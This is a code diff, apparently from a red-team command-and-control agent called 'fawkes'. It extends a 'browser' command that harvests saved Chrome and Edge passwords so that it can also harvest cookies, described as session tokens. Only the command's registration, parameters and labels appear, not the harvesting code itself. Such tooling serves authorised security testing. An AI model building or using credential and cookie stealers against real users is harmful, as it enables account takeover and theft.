@@ -9,8 +9,8 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "browser",
-		Description:         "Harvest saved credentials from Chromium-based browsers (Chrome, Edge) via DPAPI + AES-GCM decryption (T1555.003)",
-		HelpString:          "browser [-action <passwords>] [-browser <all|chrome|edge>]",
+		Description:         "Harvest saved credentials and cookies from Chromium-based browsers (Chrome, Edge) via DPAPI + AES-GCM decryption (T1555.003)",
+		HelpString:          "browser [-action <passwords|cookies>] [-browser <all|chrome|edge>]",
 		Version:             1,
 		SupportedUIFeatures: []string{},
 		Author:              "@galoryber",
@@ -25,8 +25,8 @@ func init() {
 				ModalDisplayName: "Action",
 				CLIName:          "action",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:          []string{"passwords"},
-				Description:      "What to harvest. Currently supports: passwords.",
+				Choices:          []string{"passwords", "cookies"},
+				Description:      "What to harvest: passwords (saved logins) or cookies (session tokens).",
 				DefaultValue:     "passwords",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
@@ -71,9 +71,13 @@ func init() {
 			if browser == "" {
 				browser = "all"
 			}
-			display := fmt.Sprintf("%s", browser)
+			action, _ := taskData.Args.GetStringArg("action")
+			if action == "" {
+				action = "passwords"
+			}
+			display := fmt.Sprintf("%s %s", action, browser)
 			response.DisplayParams = &display
-			createArtifact(taskData.Task.ID, "File Read", fmt.Sprintf("Browser credential database access — %s", browser))
+			createArtifact(taskData.Task.ID, "File Read", fmt.Sprintf("Browser %s database access — %s", action, browser))
 			return response
 		},
 		TaskFunctionProcessResponse: nil,
